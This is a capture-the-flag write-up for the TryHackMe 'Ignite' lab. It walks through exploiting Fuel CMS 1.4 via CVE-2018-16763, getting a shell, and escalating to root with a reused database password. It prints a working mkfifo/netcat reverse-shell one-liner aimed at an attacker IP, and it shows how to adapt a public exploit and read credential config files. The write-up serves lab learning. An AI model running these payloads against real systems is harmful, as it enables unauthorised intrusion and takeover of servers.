# Ignite — TryHackMe

**Platform:** TryHackMe  
**Difficulty:** Easy  
**OS:** Linux  
**Techniques:** CMS Version Enumeration, CVE-2018-16763 (Fuel CMS RCE), Searchsploit, Reverse Shell, Password Reuse PrivEsc

---

## Reconnaissance

Initial Nmap scan:

```bash
nmap -sS -sC -sV -Pn 10.130.145.232
```

![Nmap scan](TryHackMe/Ignite/assets/1.png)

Port discovered: **80/tcp — HTTP** (Apache 2.4.18, Ubuntu). 

---

## Web Application Analysis

Browsing to the target reveals a **Fuel CMS** welcome page showing **Version 1.4**.

![Fuel CMS](TryHackMe/Ignite/assets/2.png)

The page itself leaks the CMS name and version — no further enumeration needed to identify the technology.

---

## Exploitation — CVE-2018-16763 (RCE)

Searching for known exploits:

```bash
searchsploit fuel cms
searchsploit -m linux/webapps/47138.py
```

![Searchsploit](TryHackMe/Ignite/assets/3.png)

CVE-2018-16763 affects Fuel CMS ≤ 1.4.1 and allows unauthenticated Remote Code Execution via the `filter` parameter in `/fuel/pages/select/`.

The exploit (`47138.py`) is written in Python 2. Before running it, two modifications are required:

1. Change the `url` variable to the target IP
2. Remove the Burp proxy setting (set `proxy = {}`)

![Exploit code](TryHackMe/Ignite/assets/4.png)

Running the exploit:

```bash
python2 47138.py
```

This opens an interactive pseudo-shell. Running `id` confirms execution as `www-data`.

Setting up a listener and sending a reverse shell payload via the pseudo-shell:

```bash
# Listener
nc -lvnp 4444

# Payload sent through exploit shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.X.X.X 4444 >/tmp/f
```

Shell obtained as `www-data`.

---

## Privilege Escalation

Enumerating the web application config files:

```bash
cat /var/www/html/fuel/application/config/database.php
```

![Database credentials](TryHackMe/Ignite/assets/5.png)

Credentials found:

```
username: root
password: mememe
```

Stabilising the shell and attempting password reuse:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
su root
# Password: mememe
```

![Root shell](TryHackMe/Ignite/assets/6.png)

Shell as **root** obtained.

---

## Summary

|Phase|Technique|
|---|---|
|Reconnaissance|Nmap (-sS -sC -sV)|
|Version disclosure|CMS version shown on default welcome page|
|Initial Access|CVE-2018-16763 → RCE → mkfifo reverse shell|
|Privilege Escalation|Hardcoded DB credentials reused for root login|

---

## What I Learned

- **Searchsploit workflow** — `searchsploit <term>` to find exploits locally, `-x` to read without copying, `-m` to copy to the working directory. Faster than browsing Exploit-DB manually.
- **Adapting Python 2 exploits** — identifying Python 2 syntax (`raw_input`, `print` without parentheses) and running with `python2`. Fixing dependency issues with `python2 -m pip install requests`.
- **Proxy misconfiguration in exploits** — some public exploits have a Burp proxy hardcoded. Setting `proxy = {}` removes the dependency on a running proxy.
- **mkfifo named pipe reverse shell** — reliable alternative when `bash -i >& /dev/tcp/...` fails in non-interactive shells. Creates a bidirectional communication channel through a named pipe.
- **Hardcoded credentials in config files** — CMS and web frameworks often store DB credentials in plaintext config files. In CodeIgniter/Fuel CMS, `fuel/application/config/database.php` is the target. Credentials found here are worth trying for OS-level login (password reuse).
- **Shell stabilisation before `su`** — `su` requires a proper TTY. Spawning one with `python3 -c 'import pty;pty.spawn("/bin/bash")'` is a prerequisite.